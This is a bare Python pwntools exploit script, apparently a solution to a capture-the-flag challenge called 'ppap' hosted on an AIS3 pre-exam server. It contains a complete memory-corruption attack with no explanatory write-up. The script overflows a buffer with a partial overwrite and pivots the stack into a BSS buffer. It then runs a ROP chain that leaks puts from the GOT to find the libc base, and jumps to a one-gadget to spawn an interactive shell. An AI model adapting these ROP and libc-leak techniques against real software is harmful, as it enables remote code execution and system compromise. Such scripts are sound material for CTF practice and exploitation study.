#!/usr/bin/env python2
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
r = remote('pre-exam-pwn.ais3.org', 10002)
#r = process('./ppap')
binary = ELF('./ppap')
libc = ELF('./libc.so.6')
buf = 0x601090
bigger_buf = 0x601a00
leave_ret = 0x4009b3
pop_rdi = 0x400a23
pop_rsi_r = 0x400a21

# need to switch buffer first or the puts will use over the stack (0x601000 - 0x601090)
payload = flat(
    leave_ret,
    bigger_buf,
    pop_rdi,
    0,
    pop_rsi_r,
    bigger_buf,
    0,
    binary.plt['read'],
    leave_ret
)

payload2 = flat(
    'DEADBEEF',
    pop_rdi,
    binary.got['puts'],
    binary.plt['puts'],
    pop_rdi,
    0,
    pop_rsi_r,
    bigger_buf + 0x50,
    0,
    binary.plt['read']
)


# 21bf9:  ff 92 68 01 00 00     call   QWORD PTR [rdx+0x168]
r.sendafter('.\n', 'A'*0x20 + p64(buf+0x8) + '\xf9')
r.sendlineafter('overflow? ', str(buf-0x168))
r.sendlineafter('> ',payload)
raw_input() # need this to hold input until read start
r.send(payload2)
libc_base = u64(r.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - libc.symbols['puts']
magic = libc_base + 0x4f322
raw_input() # need this to hold input until read start
r.send(p64(magic))

r.interactive()
